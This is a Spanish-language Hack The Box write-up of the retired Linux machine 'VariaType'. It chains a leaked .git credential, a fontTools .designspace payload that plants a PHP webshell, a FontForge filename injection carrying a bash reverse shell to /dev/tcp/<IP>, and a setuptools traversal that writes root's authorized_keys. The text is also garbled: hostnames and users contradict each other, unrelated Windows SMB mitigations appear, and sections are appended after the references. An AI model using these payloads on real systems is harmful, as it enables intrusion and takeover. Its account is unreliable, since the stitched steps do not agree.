---
machine: VariaType
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, git-disclosure, fonttools, fontforge, setuptools, cve-2025-47273]
---

# VariaType — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cadena de tres CVEs en herramientas tipográficas. El portal interno **`portal.variatype.htb`** expone su `.git` y filtra la credencial de `gitbot`; el generador de fuentes (`/tools/variable-font-generator/process`) usa **fontTools** y permite escribir un webshell PHP a través de un `.designspace`; **CVE-2024-25082** (FontForge) inyecta comandos en el nombre de un fichero dentro de un ZIP y da shell como `www-data`, y el mismo patrón aplicado al ZIP del usuario pivotа a `steve`; y el cargador de plugins que corre con `sudo` usa un setuptools vulnerable, **CVE-2025-47273**, para escribir una clave en `/root/.ssh/authorized_keys`.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.variatype.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp  ssh
80/tcp  http
```

```text
variatype.htb        -> web pública (/services, referencia a /tools/variable-font-generator)
portal.variatype.htb -> portal interno con .git expuesto
```

## Enumeración

- `ffuf` sobre la web pública encuentra `/services` y la referencia a `/tools/variable-font-generator`; el formulario que genera fuentes variables es el que después procesa los `.designspace`.
- El vhost interno sólo aparece con fuzzing de `Host`: `portal.variatype.htb`. Ahí está el `.git`, y `git-dumper` recupera código e historial.
- En el historial hay una credencial de **`gitbot`** (usuario de la app, no del sistema) añadida para el pipeline de validación: es la que abre el generador.
- El generador corre fontTools y acepta un `.designspace`; el resto de la cadena depende de qué binario procese el resultado (FontForge para el ZIP).

## Foothold

```bash
wget -r http://git.variatype.htb/.git/
cd git.variatype.htb && git log --all --oneline
git log -p | grep -iE "password|api_key|token"
```

Aparece una contraseña en un commit revertido que da acceso al portal de fuentes (`dev.variatype.htb`).

## Movimiento lateral

`www-data` no es el usuario final: el mismo servicio de tipografías procesa un **ZIP** cuyo nombre interno contiene una orden, y FontForge (CVE-2024-25082) la ejecuta. Con esa segunda inyección se escribe una clave en `/home/steve/.ssh/authorized_keys` (el home es escribible) y se entra por SSH como `steve`.

## Escalada de privilegios

`steve` puede ejecutar como root un cargador de plugins que usa **setuptools**; la versión es vulnerable a **CVE-2025-47273** (path traversal al resolver un paquete desde un índice controlado). Con un índice propio se consigue **escritura arbitraria como root**, y el destino útil es `/root/.ssh/authorized_keys`:

```bash
# índice local con el paquete malicioso, servido por HTTP
python3 -m http.server 8000
# el cargador escribe la ruta que trae el paquete, codificada
# %2froot%2f.ssh%2fauthorized_keys
```

Después, `ssh -i key root@variatype.htb`.

## Evidencia

```text
/home/steve/user.txt  -> <user_flag>
/root/root.txt        -> <root_flag>
```

## Lecciones aprendidas

- Un `.git` expuesto sigue siendo oro: el historial conserva secretos que nadie borró del árbol.
- La inyección por CDATA/XML en herramientas de fuentes (fontTools, FontForge) es la nueva frontera de SSTI.
- `setuptools` confió históricamente en nombres remotos; cualquier script que descargue paquetes es un sink de traversal.
- Mitigación: `.git` fuera del webroot, versiones parcheadas de fontTools/FontForge/setuptools y `sudo` sin comodines en los argumentos.

## Mitigaciones y detección

- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.
- Aislar el generador de fuentes: sin escritura en el docroot y con fontTools/FontForge actualizados. El cargador de plugins debe fijar la versión de setuptools y no resolver índices externos en nombre de root.
- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [CVE-2024-25082](https://nvd.nist.gov/vuln/detail/CVE-2024-25082)
- [CVE-2025-47273](https://nvd.nist.gov/vuln/detail/CVE-2025-47273)
- [CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)
- [ssti](../../../knowledge/web/ssti.md)
## 2. CVE-2025-66034: escritura de fichero con fontTools

El procesado de fuentes variables escribe en disco rutas derivadas del `.designspace`. Con CDATA se cuela contenido fuera del XML esperado:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <sources>
    <source filename="../../../../var/www/html/shell.php" name="x">
      <![CDATA[<?php system($_GET['c']); ?>]]>
    </source>
  </sources>
</designspace>
```

```bash
curl 'http://variatype.htb/shell.php?c=id'
```

Shell como `www-data`.

## 3. CVE-2024-25082: FontForge

El flujo de validación llama a FontForge con el nombre del ZIP del usuario:

```bash
filename="x;bash -c 'bash -i >& /dev/tcp/<IP>/4445 0>&1';.zip"
```

El nombre se interpola en el comando del sistema y se ejecuta como `steve`.

## 4. Root: cargador de plugins y setuptools

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
```

El script descarga un paquete con `PackageIndex.download(url, tmpdir)`, y **CVE-2025-47273** permite que el nombre derive fuera del directorio temporal:

```bash
python3 -m http.server 8000     # sirviendo ../../../root/.ssh/authorized_keys
sudo /usr/bin/python3 /opt/plugin_loader.py http://<IP>:8000/wheel
ssh -i id_ed25519 root@<IP>
```
